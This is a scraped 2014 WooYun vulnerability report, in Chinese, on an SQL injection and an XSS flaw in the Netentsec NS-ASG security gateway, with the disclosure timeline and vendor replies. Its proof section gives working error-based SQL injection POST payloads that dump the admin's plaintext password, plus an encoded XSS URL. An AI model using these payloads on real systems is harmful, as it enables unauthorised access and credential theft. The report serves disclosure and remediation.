{"id": 2637, "wybug_id": "wooyun-2014-058788", "wybug_title": "网康NS-ASG应用安全网关注入漏洞(可爆出管理员明文密码进行登录)", "wybug_corp": "北京网康科技有限公司", "wybug_author": "Tea", "wybug_date": "2014-04-28 17:19", "wybug_open_date": "2014-07-27 17:20", "wybug_type": "非授权访问", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注入"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-04-28：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-05-02：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-05-05：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-06-26：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-07-06：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-07-16：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-07-27：\t细节向公众公开  简要描述： 在继续 http://www.wooyun.org/bugs/wooyun-2013-044802 漏洞修补以后发现还存在一个SQL注入漏洞，不清楚是新出现的还是以前就存在的。 详细说明：  影响网康 NS-ASG 6.2网康 NS-ASG 6.3测试地址：https://202.113.WW.CC/vpnweb/index.php?para=indexhttps://115.24.ZZ.SS/vpnweb/index.php?para=indexhttps://202.113.WW.YY/vpnweb/index.php?para=index互联网搜寻，这打码法，莫怪。上个补丁以后，已经不能注入了。但是通过抓包，发现登录的包为入下：POST：\ncheck_username=admin&check_username1=admin&check_passwd=wocaoadmin123&action=login_check&check_VirtualSiteId=1&imgcode=undefined&selvalue=2&BackgroundName=background.gif\ncheck_username1参数：\n\n\n\n搞清楚了转义了..单引号进去会转义'==>\\'\"==>\\\"\\==>\\\\(这里乌云会自己多转...)然后，单引号双引号被替换为空(吃掉)，留下一个转义符，把最后结尾的闭合给注释掉，又如下，遗留一个反斜杠，导致SQL语句出错。\n\n进数据库会报错，闭合不了前面的单引号。。但是，check_VirtualSiteId这个参数为数字型的，无需闭合，所以，漏洞产生，可以利用了。另外还有个XSS漏洞：/userpasswd.php?c=Jz48c2NyaXB0PmFsZXJ0KC94c3MvKTwvc2NyaXB0Pjwn   漏洞证明：  查询帐号密码：POST：\ncheck_username=admin&check_username1=1&check_passwd=321&action=login_check&check_VirtualSiteId=1/**/and/**/1=(updatexml(1,concat(0x5e24,(select/**/concat(username,0x3a,password)/**/from/**/ISCUserTable/**/limit/**/1),0x5e24),1))#&imgcode=undefined&selvalue=2&BackgroundName=background.gif\n\n\n查询其他信息：POST：\ncheck_username=admin&check_username1=1&check_passwd=321&action=login_check&check_VirtualSiteId=1/**/and/**/1=(updatexml(1,concat(0x5e24,(select/**/concat(version(),0x3a,user())),0x5e24),1))#&imgcode=undefined&selvalue=2&BackgroundName=background.gif\n\n\n居然是明文密码，直接登录进去了。。。\n\n   修复方案：  屏蔽错误报告？数字型的肯定强制转换。。。   版权声明：转载请注明来源 Tea@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2014-05-02 21:55 厂商回复： CNVD根据图片先行确认测试情况（目前手工测试暂未有其他实例），已经先行将漏洞信息转报给设备生产厂商——网康公司。根据生产厂商2日最新反馈情况，厂商已经着手查找用户列表进行修复，同时已经发布ASG6.3 Patch2补丁，建议用户向软生产厂产寻求补丁及解决方案。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-04-28 17:32 |    \t\tlucky \t\t\t( 普通白帽子  |\t\t\t        Rank:409 漏洞数:84        | 三人行必有我师焉########################...)\t\t \n  这么厉害呀！    \n     2014-04-30 09:23 |    \t\tcncert国家互联网应急中心(乌云厂商)\t\t \n  与 WooYun: 网康 NS-ASG 应用安全网关注入漏洞  认定为同一个，只不过绕过规则不一样。    \n     2014-04-30 11:00 |    \t\tTea \t\t\t( 普通白帽子  |\t\t\t        Rank:297 漏洞数:37        | Can't We Be Young.)\t\t \n  @cncert国家互联网应急中心 。。。一个时间点都不一样。。参数也不一样。。。    \n     2014-04-30 14:18 |    \t\tcncert国家互联网应急中心(乌云厂商)\t\t \n  @Tea 已经先期提交给网康公司，后续实例检测还在进行（目前复现的几乎没有）。厂商先行向您表示感谢，后续会有表示    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}